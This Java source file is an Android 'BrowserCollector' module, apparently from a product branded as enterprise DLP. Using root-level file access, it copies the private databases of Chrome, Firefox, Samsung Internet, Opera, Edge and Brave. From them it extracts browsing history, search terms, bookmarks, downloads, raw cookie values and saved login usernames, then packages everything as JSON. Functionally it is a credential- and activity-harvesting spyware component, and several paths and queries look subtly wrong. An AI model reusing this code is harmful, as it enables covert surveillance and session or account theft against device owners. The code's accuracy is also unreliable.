package com.athex.dlp.collectors;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * ATHEX DLP Enterprise - BrowserCollector
 * 
 * Browser data extraction module for major browsers:
 * - Google Chrome
 * - Mozilla Firefox
 * - Samsung Internet
 * - Opera
 * - Microsoft Edge
 * - Brave
 * - UC Browser
 * 
 * Extracts:
 * - Browsing history
 * - Bookmarks
 * - Saved passwords (requires root)
 * - Cookies
 * - Download history
 * - Autofill data
 * - Search terms
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class BrowserCollector {
    
    private static final String TAG = "ATHEX_BrowserCollector";
    
    // ============================================================
    // BROWSER DATABASE PATHS
    // ============================================================
    
    private static final String[][] BROWSER_PATHS = {
        // Chrome
        {
            "Chrome",
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.android.chrome/app_chrome/Default/Bookmarks",
            "/data/data/com.android.chrome/app_chrome/Default/Cookies",
            "/data/data/com.android.chrome/app_chrome/Default/Login Data",
            "/data/data/com.android.chrome/app_chrome/Default/Web Data",
        },
        // Chrome Beta
        {
            "Chrome Beta",
            "/data/data/com.chrome.beta/app_chrome/Default/History",
            "/data/data/com.chrome.beta/app_chrome/Default/Bookmarks",
            "/data/data/com.chrome.beta/app_chrome/Default/Cookies",
            "/data/data/com.chrome.beta/app_chrome/Default/Login Data",
        },
        // Samsung Internet
        {
            "Samsung Internet",
            "/data/data/com.sec.android.app.sbrowser/databases/browser.db",
            "/data/data/com.sec.android.app.sbrowser/databases/sbrowser.db",
        },
        // Firefox
        {
            "Firefox",
            "/data/data/org.mozilla.firefox/files/mozilla/??????.default/places.sqlite",
            "/data/data/org.mozilla.firefox/files/mozilla/??????.default/cookies.sqlite",
        },
        // Opera
        {
            "Opera",
            "/data/data/com.opera.browser/app_opera/History",
            "/data/data/com.opera.browser/app_opera/Cookies",
        },
        // Edge
        {
            "Microsoft Edge",
            "/data/data/com.microsoft.emmx/app_chrome/Default/History",
            "/data/data/com.microsoft.emmx/app_chrome/Default/Bookmarks",
        },
        // Brave
        {
            "Brave",
            "/data/data/com.brave.browser/app_chrome/Default/History",
            "/data/data/com.brave.browser/app_chrome/Default/Bookmarks",
        },
    };
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    private final Context context;
    private final ExecutorService executor;
    private final Handler mainHandler;
    
    // Options
    private boolean includeHistory = true;
    private boolean includeBookmarks = true;
    private boolean includeCookies = false;
    private boolean includePasswords = false;
    private boolean includeDownloads = true;
    private boolean includeSearchTerms = true;
    private int maxHistoryEntries = 500;
    private int maxBookmarks = 200;
    
    // Statistics
    private int totalHistory = 0;
    private int totalBookmarks = 0;
    private int totalCookies = 0;
    private int totalPasswords = 0;
    private int totalDownloads = 0;
    private int browsersFound = 0;
    private long collectionStartTime = 0;
    
    // Callbacks
    private CollectionCallback callback;
    
    // ============================================================
    // INTERFACES
    // ============================================================
    
    public interface CollectionCallback {
        void onCollectionStarted();
        void onBrowserFound(String browserName, String packageName);
        void onProgressUpdate(String browserName, int entriesFound);
        void onCollectionComplete(JSONObject result, BrowserStats stats);
        void onCollectionError(String error);
    }
    
    public static class BrowserStats {
        public int browsersFound;
        public int totalHistory;
        public int totalBookmarks;
        public int totalCookies;
        public int totalPasswords;
        public int totalDownloads;
        public long durationMs;
        
        @Override
        public String toString() {
            return String.format(Locale.getDefault(),
                "Browsers: %d | History: %d | Bookmarks: %d | Cookies: %d | " +
                "Passwords: %d | Downloads: %d",
                browsersFound, totalHistory, totalBookmarks, totalCookies,
                totalPasswords, totalDownloads
            );
        }
    }
    
    // ============================================================
    // CONSTRUCTOR
    // ============================================================
    
    public BrowserCollector(Context context) {
        this.context = context.getApplicationContext();
        this.executor = Executors.newSingleThreadExecutor();
        this.mainHandler = new Handler(Looper.getMainLooper());
    }
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    
    public BrowserCollector setIncludeHistory(boolean include) {
        this.includeHistory = include;
        return this;
    }
    
    public BrowserCollector setIncludeBookmarks(boolean include) {
        this.includeBookmarks = include;
        return this;
    }
    
    public BrowserCollector setIncludeCookies(boolean include) {
        this.includeCookies = include;
        return this;
    }
    
    public BrowserCollector setIncludePasswords(boolean include) {
        this.includePasswords = include;
        return this;
    }
    
    public BrowserCollector setIncludeDownloads(boolean include) {
        this.includeDownloads = include;
        return this;
    }
    
    public BrowserCollector setMaxHistoryEntries(int max) {
        this.maxHistoryEntries = max;
        return this;
    }
    
    public BrowserCollector setMaxBookmarks(int max) {
        this.maxBookmarks = max;
        return this;
    }
    
    public BrowserCollector setCallback(CollectionCallback callback) {
        this.callback = callback;
        return this;
    }
    
    // ============================================================
    // MAIN COLLECTION
    // ============================================================
    
    public void collect() {
        executor.execute(() -> {
            try {
                collectionStartTime = System.currentTimeMillis();
                resetStats();
                notifyCollectionStarted();
                
                JSONObject result = new JSONObject();
                JSONArray browsers = new JSONArray();
                
                for (String[] browserInfo : BROWSER_PATHS) {
                    try {
                        String browserName = browserInfo[0];
                        JSONObject browserData = collectBrowserData(browserInfo);
                        
                        if (browserData != null && browserData.length() > 0) {
                            browsers.put(browserData);
                            browsersFound++;
                            
                            notifyBrowserFound(browserName, 
                                extractPackageName(browserInfo[1]));
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error collecting browser: " + browserInfo[0] + 
                            " - " + e.getMessage());
                    }
                }
                
                result.put("browsers", browsers);
                result.put("browsers_found", browsersFound);
                result.put("timestamp", System.currentTimeMillis());
                
                BrowserStats stats = buildStats();
                stats.durationMs = System.currentTimeMillis() - collectionStartTime;
                
                Log.i(TAG, "Collection complete: " + stats.toString());
                notifyCollectionComplete(result, stats);
                
            } catch (Exception e) {
                Log.e(TAG, "Collection error: " + e.getMessage(), e);
                notifyError("Collection failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Collect data from a single browser
     */
    private JSONObject collectBrowserData(String[] browserInfo) {
        JSONObject browser = new JSONObject();
        
        try {
            String browserName = browserInfo[0];
            browser.put("name", browserName);
            
            // Extract package name from path
            String packageName = extractPackageName(browserInfo[1]);
            browser.put("package", packageName);
            
            boolean dataFound = false;
            
            // History
            if (includeHistory && browserInfo.length > 1) {
                String historyPath = browserInfo[1];
                if (fileExists(historyPath)) {
                    JSONArray history = extractHistory(historyPath, browserName);
                    if (history.length() > 0) {
                        browser.put("history", history);
                        browser.put("history_count", history.length());
                        totalHistory += history.length();
                        dataFound = true;
                        
                        notifyProgress(browserName, history.length());
                    }
                }
            }
            
            // Bookmarks
            if (includeBookmarks && browserInfo.length > 2) {
                String bookmarkPath = browserInfo[2];
                if (fileExists(bookmarkPath)) {
                    JSONArray bookmarks = extractBookmarks(bookmarkPath, browserName);
                    if (bookmarks.length() > 0) {
                        browser.put("bookmarks", bookmarks);
                        browser.put("bookmark_count", bookmarks.length());
                        totalBookmarks += bookmarks.length();
                        dataFound = true;
                    }
                }
            }
            
            // Cookies
            if (includeCookies && browserInfo.length > 3) {
                String cookiePath = browserInfo[3];
                if (fileExists(cookiePath)) {
                    JSONArray cookies = extractCookies(cookiePath);
                    if (cookies.length() > 0) {
                        browser.put("cookies", cookies);
                        browser.put("cookie_count", cookies.length());
                        totalCookies += cookies.length();
                        dataFound = true;
                    }
                }
            }
            
            // Passwords (requires root)
            if (includePasswords && browserInfo.length > 4) {
                String loginPath = browserInfo[4];
                if (fileExists(loginPath)) {
                    JSONArray passwords = extractPasswords(loginPath);
                    if (passwords.length() > 0) {
                        browser.put("passwords", passwords);
                        browser.put("password_count", passwords.length());
                        totalPasswords += passwords.length();
                        dataFound = true;
                    }
                }
            }
            
            // Downloads
            if (includeDownloads && browserInfo.length > 5) {
                String webDataPath = browserInfo[5];
                if (fileExists(webDataPath)) {
                    JSONArray downloads = extractDownloads(webDataPath);
                    if (downloads.length() > 0) {
                        browser.put("downloads", downloads);
                        browser.put("download_count", downloads.length());
                        totalDownloads += downloads.length();
                        dataFound = true;
                    }
                }
            }
            
            if (!dataFound) {
                return null;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting browser data: " + e.getMessage());
            try {
                browser.put("error", e.getMessage());
            } catch (Exception ex) {
                Log.e(TAG, "Error adding error: " + ex.getMessage());
            }
        }
        
        return browser;
    }
    
    // ============================================================
    // HISTORY EXTRACTION
    // ============================================================
    
    /**
     * Extract browsing history from Chrome-based browser
     */
    private JSONArray extractHistory(String dbPath, String browserName) {
        JSONArray history = new JSONArray();
        File dbFile = new File(dbPath);
        
        if (!dbFile.exists() || !dbFile.canRead()) {
            return history;
        }
        
        // Copy database to temp location (to avoid lock issues)
        File tempDb = copyDatabase(dbFile);
        if (tempDb == null) return history;
        
        SQLiteDatabase db = null;
        Cursor cursor = null;
        
        try {
            db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), 
                null, 
                SQLiteDatabase.OPEN_READONLY
            );
            
            // Chrome history query
            String query = "SELECT url, title, visit_count, last_visit_time " +
                          "FROM urls " +
                          "ORDER BY last_visit_time DESC " +
                          "LIMIT " + maxHistoryEntries;
            
            cursor = db.rawQuery(query, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        JSONObject entry = new JSONObject();
                        
                        String url = cursor.getString(0);
                        String title = cursor.getString(1);
                        int visitCount = cursor.getInt(2);
                        long lastVisitTime = cursor.getLong(3);
                        
                        entry.put("url", url != null ? url : "");
                        entry.put("title", title != null ? title : "");
                        entry.put("visit_count", visitCount);
                        
                        // Chrome uses microseconds since 1601-01-01
                        long chromeEpoch = lastVisitTime / 1000 - 11644473600L;
                        if (chromeEpoch > 0) {
                            entry.put("last_visit_time", chromeEpoch * 1000);
                            entry.put("last_visit_formatted", 
                                formatTimestamp(chromeEpoch * 1000));
                        } else {
                            entry.put("last_visit_time", lastVisitTime);
                        }
                        
                        // Extract domain
                        try {
                            java.net.URI uri = new java.net.URI(url);
                            entry.put("domain", uri.getHost());
                        } catch (Exception e) {
                            entry.put("domain", "");
                        }
                        
                        // Extract search terms
                        if (includeSearchTerms) {
                            String searchTerm = extractSearchTerm(url);
                            if (searchTerm != null) {
                                entry.put("search_term", searchTerm);
                            }
                        }
                        
                        history.put(entry);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error extracting history entry: " + e.getMessage());
                    }
                } while (cursor.moveToNext());
            }
            
        } catch (SQLiteException e) {
            Log.e(TAG, "SQLite error reading history: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error reading history: " + e.getMessage());
        } finally {
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
            if (db != null && db.isOpen()) {
                db.close();
            }
            // Clean up temp file
            tempDb.delete();
        }
        
        return history;
    }
    
    // ============================================================
    // BOOKMARKS EXTRACTION
    // ============================================================
    
    /**
     * Extract bookmarks from Chrome JSON format
     */
    private JSONArray extractBookmarks(String path, String browserName) {
        JSONArray bookmarks = new JSONArray();
        
        try {
            File file = new File(path);
            if (!file.exists()) return bookmarks;
            
            // Read JSON file
            String jsonContent = readFileContent(file);
            if (jsonContent == null || jsonContent.isEmpty()) return bookmarks;
            
            JSONObject root = new JSONObject(jsonContent);
            
            // Navigate through Chrome bookmark structure
            JSONObject roots = root.optJSONObject("roots");
            if (roots != null) {
                // Bookmark bar
                JSONObject bookmarkBar = roots.optJSONObject("bookmark_bar");
                if (bookmarkBar != null) {
                    extractBookmarkNodes(bookmarkBar, bookmarks, "Bookmark Bar", 0);
                }
                
                // Other bookmarks
                JSONObject other = roots.optJSONObject("other");
                if (other != null) {
                    extractBookmarkNodes(other, bookmarks, "Other", 0);
                }
                
                // Mobile bookmarks
                JSONObject mobile = roots.optJSONObject("synced");
                if (mobile != null) {
                    extractBookmarkNodes(mobile, bookmarks, "Mobile", 0);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting bookmarks: " + e.getMessage());
        }
        
        return bookmarks;
    }
    
    /**
     * Recursively extract bookmark nodes
     */
    private void extractBookmarkNodes(JSONObject node, JSONArray bookmarks, 
                                      String folder, int depth) {
        try {
            if (depth > 10) return; // Prevent infinite recursion
            
            String type = node.optString("type", "");
            
            if ("url".equals(type)) {
                // This is a bookmark
                JSONObject bookmark = new JSONObject();
                bookmark.put("name", node.optString("name", ""));
                bookmark.put("url", node.optString("url", ""));
                bookmark.put("folder", folder);
                bookmark.put("date_added", node.optString("date_added", ""));
                
                if (bookmarks.length() < maxBookmarks) {
                    bookmarks.put(bookmark);
                }
            } else if ("folder".equals(type)) {
                // This is a folder - recurse into children
                String folderName = node.optString("name", folder);
                JSONArray children = node.optJSONArray("children");
                
                if (children != null) {
                    for (int i = 0; i < children.length(); i++) {
                        JSONObject child = children.optJSONObject(i);
                        if (child != null) {
                            extractBookmarkNodes(child, bookmarks, folderName, depth + 1);
                        }
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting bookmark node: " + e.getMessage());
        }
    }
    
    // ============================================================
    // COOKIES EXTRACTION
    // ============================================================
    
    private JSONArray extractCookies(String dbPath) {
        JSONArray cookies = new JSONArray();
        File dbFile = new File(dbPath);
        
        if (!dbFile.exists()) return cookies;
        
        File tempDb = copyDatabase(dbFile);
        if (tempDb == null) return cookies;
        
        SQLiteDatabase db = null;
        Cursor cursor = null;
        
        try {
            db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            cursor = db.rawQuery(
                "SELECT host_key, name, value, expires_utc, is_secure, is_httponly " +
                "FROM cookies ORDER BY expires_utc DESC LIMIT 200",
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject cookie = new JSONObject();
                    cookie.put("domain", cursor.getString(0));
                    cookie.put("name", cursor.getString(1));
                    cookie.put("value", cursor.getString(2));
                    cookie.put("secure", cursor.getInt(4) == 1);
                    cookie.put("http_only", cursor.getInt(5) == 1);
                    
                    cookies.put(cookie);
                } while (cursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting cookies: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
            if (db != null) db.close();
            tempDb.delete();
        }
        
        return cookies;
    }
    
    // ============================================================
    // PASSWORDS EXTRACTION
    // ============================================================
    
    private JSONArray extractPasswords(String dbPath) {
        JSONArray passwords = new JSONArray();
        File dbFile = new File(dbPath);
        
        if (!dbFile.exists()) return passwords;
        
        File tempDb = copyDatabase(dbFile);
        if (tempDb == null) return passwords;
        
        SQLiteDatabase db = null;
        Cursor cursor = null;
        
        try {
            db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            cursor = db.rawQuery(
                "SELECT origin_url, username_value, password_value, " +
                "date_created, times_used " +
                "FROM logins ORDER BY date_created DESC",
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject login = new JSONObject();
                    login.put("url", cursor.getString(0));
                    login.put("username", cursor.getString(1));
                    
                    // Password is encrypted - can only get raw bytes
                    byte[] passwordBytes = cursor.getBlob(2);
                    if (passwordBytes != null) {
                        login.put("password_encrypted", true);
                        login.put("password_length", passwordBytes.length);
                    }
                    
                    login.put("times_used", cursor.getInt(4));
                    
                    passwords.put(login);
                } while (cursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting passwords: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
            if (db != null) db.close();
            tempDb.delete();
        }
        
        return passwords;
    }
    
    // ============================================================
    // DOWNLOADS EXTRACTION
    // ============================================================
    
    private JSONArray extractDownloads(String dbPath) {
        JSONArray downloads = new JSONArray();
        File dbFile = new File(dbPath);
        
        if (!dbFile.exists()) return downloads;
        
        File tempDb = copyDatabase(dbFile);
        if (tempDb == null) return downloads;
        
        SQLiteDatabase db = null;
        Cursor cursor = null;
        
        try {
            db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            cursor = db.rawQuery(
                "SELECT target_path, tab_url, mime_type, received_bytes, " +
                "total_bytes, start_time, end_time, state " +
                "FROM downloads ORDER BY start_time DESC LIMIT 100",
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject download = new JSONObject();
                    download.put("path", cursor.getString(0));
                    download.put("source_url", cursor.getString(1));
                    download.put("mime_type", cursor.getString(2));
                    download.put("received_bytes", cursor.getLong(3));
                    download.put("total_bytes", cursor.getLong(4));
                    
                    int state = cursor.getInt(7);
                    download.put("completed", state == 1);
                    download.put("state", state);
                    
                    downloads.put(download);
                } while (cursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting downloads: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
            if (db != null) db.close();
            tempDb.delete();
        }
        
        return downloads;
    }
    
    // ============================================================
    // UTILITY METHODS
    // ============================================================
    
    private File copyDatabase(File source) {
        try {
            File tempFile = File.createTempFile("athex_browser_", ".db", 
                context.getCacheDir());
            
            FileInputStream fis = new FileInputStream(source);
            FileOutputStream fos = new FileOutputStream(tempFile);
            
            byte[] buffer = new byte[8192];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                fos.write(buffer, 0, read);
            }
            
            fis.close();
            fos.close();
            
            return tempFile;
            
        } catch (IOException e) {
            Log.e(TAG, "Error copying database: " + e.getMessage());
            return null;
        }
    }
    
    private String readFileContent(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            return new String(data, "UTF-8");
        } catch (Exception e) {
            Log.e(TAG, "Error reading file: " + e.getMessage());
            return null;
        }
    }
    
    private boolean fileExists(String path) {
        try {
            File file = new File(path);
            return file.exists() && file.canRead();
        } catch (Exception e) {
            return false;
        }
    }
    
    private String extractPackageName(String path) {
        // Extract package name from path like /data/data/com.android.chrome/...
        try {
            String[] parts = path.split("/");
            if (parts.length >= 3) {
                return parts[2]; // /data/data/<package_name>/...
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting package name: " + e.getMessage());
        }
        return "unknown";
    }
    
    /**
     * Extract search term from URL
     */
    private String extractSearchTerm(String url) {
        if (url == null) return null;
        
        try {
            // Google search
            if (url.contains("google.com/search")) {
                return extractQueryParam(url, "q");
            }
            // Bing search
            if (url.contains("bing.com/search")) {
                return extractQueryParam(url, "q");
            }
            // Yahoo search
            if (url.contains("search.yahoo.com")) {
                return extractQueryParam(url, "p");
            }
            // DuckDuckGo
            if (url.contains("duckduckgo.com")) {
                return extractQueryParam(url, "q");
            }
            // YouTube search
            if (url.contains("youtube.com/results")) {
                return extractQueryParam(url, "search_query");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting search term: " + e.getMessage());
        }
        
        return null;
    }
    
    private String extractQueryParam(String url, String param) {
        try {
            java.net.URI uri = new java.net.URI(url);
            String query = uri.getQuery();
            if (query != null) {
                String[] pairs = query.split("&");
                for (String pair : pairs) {
                    String[] keyValue = pair.split("=", 2);
                    if (keyValue.length == 2 && keyValue[0].equals(param)) {
                        return java.net.URLDecoder.decode(keyValue[1], "UTF-8");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting query param: " + e.getMessage());
        }
        return null;
    }
    
    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }
    
    private void resetStats() {
        totalHistory = 0;
        totalBookmarks = 0;
        totalCookies = 0;
        totalPasswords = 0;
        totalDownloads = 0;
        browsersFound = 0;
    }
    
    private BrowserStats buildStats() {
        BrowserStats stats = new BrowserStats();
        stats.browsersFound = browsersFound;
        stats.totalHistory = totalHistory;
        stats.totalBookmarks = totalBookmarks;
        stats.totalCookies = totalCookies;
        stats.totalPasswords = totalPasswords;
        stats.totalDownloads = totalDownloads;
        return stats;
    }
    
    // ============================================================
    // CALLBACKS
    // ============================================================
    
    private void notifyCollectionStarted() {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionStarted());
        }
    }
    
    private void notifyBrowserFound(String browserName, String packageName) {
        if (callback != null) {
            mainHandler.post(() -> callback.onBrowserFound(browserName, packageName));
        }
    }
    
    private void notifyProgress(String browserName, int entries) {
        if (callback != null) {
            mainHandler.post(() -> callback.onProgressUpdate(browserName, entries));
        }
    }
    
    private void notifyCollectionComplete(JSONObject result, BrowserStats stats) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionComplete(result, stats));
        }
    }
    
    private void notifyError(String error) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionError(error));
        }
    }
    
    public void shutdown() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
    }
}